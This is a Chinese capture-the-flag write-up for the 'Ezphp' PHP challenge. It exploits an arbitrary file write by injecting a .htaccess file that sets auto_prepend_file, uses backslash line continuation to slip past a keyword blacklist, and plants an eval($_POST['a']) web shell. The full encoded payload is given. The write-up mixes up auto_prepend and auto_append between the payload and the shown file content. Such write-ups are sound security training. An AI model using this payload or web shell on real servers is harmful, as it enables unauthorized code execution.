# Ezphp

打开就看见源码

```php
 <?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?> 
```



能够任意文件写，但文件名只能是小写字母，内容不能含有黑名单的字符串。

考虑写入`.htaccess`或者`.user.ini`，来修改PHP配置。

但不管写入什么，结尾总会插入一行`\nJust one chance`，如果处理不好，`.htaccess`会读取失败然后报错500。

`.htaccess`以井号`#`最为注释符

可以使用反斜杠`\`作为续航符，同时也可以绕过黑名单的关键字检测。

`.htaccess`不仅可以写规则，还可以写PHP配置，联想到SUCTF的.user.ini,再.htaccess找到类似的的，使用`php_value`。

组合起来，payload如下

`index.php?filename=.htaccess&content=php_value%20auto_prepend_f%5C%0Aile%20.htaccess%0A%23%3C%3Fphp%20eval%28%24_POST%5Ba%5D%29%3B%3F%3E%0A%23%5C`

就会写入.htaccess，内容如下：

```html
php_value auto_append_f\
ile .htaccess
#<?php eval($_POST['a']); ?>
#\
Just one chance
```

会在所有PHP文件执行的结尾插入一句话木马，密码为a。



![phpinfo](https://upload-images.jianshu.io/upload_images/11317931-8bdaccadea12d419.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

用蚁剑连上，执行命令`find / -name flag*`
找到`/root/flag.txt`，获得flag
`flag{6fe9e99e-a39f-499a-9414-528b6f410f27}`